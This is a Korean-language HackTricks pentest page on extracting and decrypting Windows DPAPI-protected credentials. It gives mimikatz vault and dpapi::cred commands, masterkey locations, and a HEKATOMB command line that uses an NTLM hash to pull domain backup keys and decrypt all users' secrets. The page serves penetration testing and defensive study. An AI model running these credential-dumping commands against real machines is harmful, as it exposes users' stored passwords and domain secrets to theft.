# DPAPI - 비밀번호 추출

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **영웅으로 가는 AWS 해킹을 처음부터 배우세요**!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으세요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으세요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출**해주세요.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 중요한 사이버 보안 이벤트 중 하나이며 **유럽**에서도 가장 중요한 행사 중 하나입니다. **기술 지식을 촉진**하는 임무를 가진 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들을 위한 뜨거운 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

## DPAPI란

데이터 보호 API (DPAPI)는 주로 **비대칭 개인 키의 대칭 암호화**를 위해 Windows 운영 체제 내에서 사용되며 사용자 또는 시스템 비밀을 엔트로피의 중요한 원천으로 활용합니다. 이 접근 방식은 개발자가 사용자의 로그온 비밀 또는 시스템의 도메인 인증 비밀에서 파생된 키를 사용하여 데이터를 암호화할 수 있도록 하여, 개발자가 암호화 키의 보호를 직접 관리할 필요가 없도록 합니다.

### DPAPI로 보호된 데이터

DPAPI로 보호되는 개인 데이터 중 일부는 다음과 같습니다:

* Internet Explorer 및 Google Chrome의 비밀번호 및 자동 완성 데이터
* Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
* 공유 폴더, 리소스, 무선 네트워크 및 Windows 보관고의 비밀번호, 암호화 키 포함
* 원격 데스크톱 연결, .NET Passport 및 다양한 암호화 및 인증 목적의 개인 키를 위한 비밀번호
* Credential Manager로 관리되는 네트워크 비밀번호 및 Skype, MSN 메신저 등의 CryptProtectData를 사용하는 애플리케이션에서의 개인 데이터

## 보관함 목록
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 자격 증명 파일

**보호된 자격 증명 파일**은 다음 위치에 있을 수 있습니다:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
`mimikatz dpapi::cred`를 사용하여 자격 증명 정보를 가져옵니다. 응답에서 암호화된 데이터와 guidMasterKey와 같은 흥미로운 정보를 찾을 수 있습니다.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
당신은 적절한 `/masterkey`를 사용하여 **mimikatz 모듈** `dpapi::cred`를 사용하여 복호화할 수 있습니다:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 마스터 키

사용자의 RSA 키를 암호화하는 데 사용되는 DPAPI 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉토리에 저장됩니다. 여기서 {SID}는 해당 사용자의 [**보안 식별자**](https://en.wikipedia.org/wiki/Security\_Identifier)입니다. **DPAPI 키는 사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 저장됩니다**. 일반적으로 64바이트의 무작위 데이터입니다. (이 디렉토리는 보호되어 있으므로 cmd에서 `dir`을 사용하여 목록을 볼 수는 없지만 PS에서는 볼 수 있습니다).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
이것이 사용자의 일련의 마스터 키들이 보일 것입니다:

![](<../../.gitbook/assets/image (1121).png>)

보통 **각 마스터 키는 다른 콘텐츠를 해독할 수 있는 암호화된 대칭 키**입니다. 따라서 **암호화된 마스터 키를 추출**하여 나중에 그것으로 **암호화된 다른 콘텐츠를 해독**하는 것이 흥미로울 것입니다.

### 마스터 키 추출 및 해독

마스터 키를 추출하고 해독하는 방법에 대한 예제는 [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)에서 확인할 수 있습니다.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)는 [@gentilkiwi](https://twitter.com/gentilkiwi)의 [Mimikatz](https://github.com/gentilkiwi/mimikatz/) 프로젝트에서 일부 DPAPI 기능을 C#으로 이식한 것입니다.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)은 LDAP 디렉터리에서 모든 사용자 및 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 자동화 도구입니다. 스크립트는 모든 컴퓨터 IP 주소를 해결하고 모든 사용자의 DPAPI 덩어리를 검색하여 도메인 백업 키로 모든 것을 해독합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP 컴퓨터 목록에서 추출하면 알지 못했던 모든 하위 네트워크를 찾을 수 있습니다!

"도메인 관리자 권한만으로는 충분하지 않습니다. 모두 해킹하세요."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다.

## 참고 자료

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 높은 사이버 보안 이벤트 중 하나이며 **유럽**에서 가장 중요한 이벤트 중 하나입니다. **기술 지식을 촉진**하기 위한 임무를 가진 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 뜨거운 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>와 함께!</strong></summary>

* **사이버 보안 회사에서 일하시나요? 귀하의 회사를 HackTricks에서 광고하고 싶으신가요? 또는 PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **hacktricks 저장소**와 **hacktricks-cloud 저장소**에 PR을 제출하여 귀하의 해킹 트릭을 공유하세요.

</details>
